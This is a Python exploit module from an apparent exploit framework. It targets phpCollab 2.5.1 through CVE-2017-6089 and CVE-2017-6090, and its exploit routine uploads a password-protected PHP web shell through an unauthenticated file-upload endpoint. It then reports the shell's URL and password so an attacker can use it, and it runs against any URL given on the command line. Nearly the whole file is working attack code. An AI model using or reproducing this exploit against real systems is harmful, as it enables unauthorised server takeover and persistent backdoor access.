#coding: utf-8

import os
import sys
import datetime
import re
import json
from exp_template import Exploit, Level, session, get_random_password

"""
构造函数需要传递以下参数:
url      要测试的目标
taskid   默认为0，当没有创建任务时使用
targetid 默认为0，当没有创建任务时使用

exp需要实现的方法为meta_info和exploit

"""
class phpcollab_fileupload_getshell(Exploit):
    def meta_info(self):
        return {
            'name': 'phpcollab_fileupload_getshell',
            'author': 'h',
            'date': '2018-03-07',
            'attack_type': 'GetShell',
            'app_type': 'CMS',              #路由器为Router
            'app_name': 'phpcollab',
            'min_version': '',
            'max_version': '2.5.1',
            'version_list': '',             #min_version,max_version 和 verion_list 二者必选其一
            'description': 'phpcollab文件上传GetShell',
            'reference':'phpcollab 2.5.1文件上传.docx',   #参考文档
            'cve':'CVE-2017-6089,CVE-2017-6090',
        } 
        
    def exploit(self):
        if self.url == '' or (not self.url.startswith('http://') and not self.url.startswith('https://')):
            self.report('url error', Level.error)
            return
        for i in range(10):
            self.url = self.url.strip('/')
        target = "%s/clients/editclient.php?id=1&action=update" % (self.url)
        randpass = get_random_password()
        backdoor = {'upload': ('%s.php'%get_random_password(), open('shell/shell02.php', 'rb').read().replace('__RANDPASS__', randpass))}
        req = session()
        try:        
            r = req.post(target, files=backdoor)
            shell = "%s/logos_clients/1.php" % (self.url)
            #print shell, randpass
            self.shell_info(shell, randpass, 'php')
        except Exception as e:
            pass        
        

if __name__ == "__main__":
    # url = 'http://localhost:92/phpCollab-v2.5.1/'
    # a =phpcollab_fileupload_getshell(url)
    # a.exploit()
    if len(sys.argv) == 2:
        a = phpcollab_fileupload_getshell(sys.argv[1])
        a.exploit()
    else:
        print '%s url' %  __file__
        print '%s http://192.168.1.11' %  __file__

